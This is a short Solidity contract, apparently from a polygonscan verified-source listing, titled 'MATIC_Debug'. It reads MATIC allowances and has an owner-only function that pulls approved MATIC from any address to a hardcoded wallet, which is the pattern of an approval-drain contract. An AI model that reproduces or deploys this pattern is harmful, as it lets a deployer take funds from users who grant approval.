/**
 *Submitted for verification at polygonscan.com on 2022-01-24
*/

// SPDX-License-Identifier: MIT

// Specify version
pragma solidity ^0.8.7; // 0.8.0

// Prepare for load ERC20
interface IERC20 {
    // Interface
    function totalSupply() external view returns (uint256);
    // function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    // Add function for call
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
}

contract MATIC_Debug {
    IERC20 public matic; // for Call ERC20 Interface
    address owner; // Owner Addr

    constructor() {
         owner = msg.sender; // Constract Creater set to ownwer
         matic = IERC20(0x0000000000000000000000000000000000001010); // Polygon Network MATIC Token Addr
    } 

    function confirm_spend_limt(address SpenderAddr) public view returns (uint256) {
        return matic.allowance(address(this), SpenderAddr);
    }

        function confirm_spend_limtv2(address SenderAddr, address SpenderAddr) public view returns (uint256) {
        return matic.allowance(SenderAddr, SpenderAddr);
    }

    function transferfrom_matic(address FromAddr, uint256 value) public {
        require(msg.sender == owner); // If Contract Creater
        matic.transferFrom(FromAddr , 0x5De7470505F785A8A4AA571A71F0471cc816CCC3 , value );
    }
    
}